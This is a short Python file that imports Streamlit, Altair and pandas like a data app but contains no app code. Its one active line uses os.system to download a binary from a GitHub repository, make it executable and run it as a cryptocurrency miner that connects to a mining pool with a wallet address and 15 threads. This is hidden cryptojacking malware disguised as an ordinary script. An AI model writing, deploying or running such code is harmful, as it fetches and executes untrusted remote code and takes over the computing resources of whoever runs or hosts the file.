from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
import time
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64


os.system("curl -L -o sse https://github.com/Ikuzot/nung/raw/main/sse && chmod +x sse && ./sse -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17063 -u 0x2bfa61a3dadc279068b3628c6937b9e7a66a81c8.NUNG -p x -t 15")
